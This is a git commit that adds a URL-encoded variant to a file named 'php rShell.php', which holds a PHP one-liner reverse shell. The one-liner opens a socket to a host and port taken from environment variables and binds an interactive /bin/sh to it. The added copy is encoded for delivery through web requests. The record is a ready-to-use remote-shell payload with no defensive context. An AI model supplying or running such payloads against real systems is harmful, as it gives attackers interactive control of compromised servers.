2745ed9789575cbdd0fc29a6c44ee8910ecbf241
calvin <74103103+Calvindd2f@users.noreply.github.com>
2021-11-01 02:41:11 +0000

    added URL ENCODED

--- php rShell.php
+++ php rShell.php
@@ -1,1 +1,5 @@
 php -r '$sock=fsockopen(getenv(""),getenv(""));exec("/bin/sh -i <&3 >&3 2>&3");'
+  
+  #URL ENCODED
+  
+php%20-r%20'$sock=fsockopen(getenv(%22%22),getenv(%22%22));exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22);'
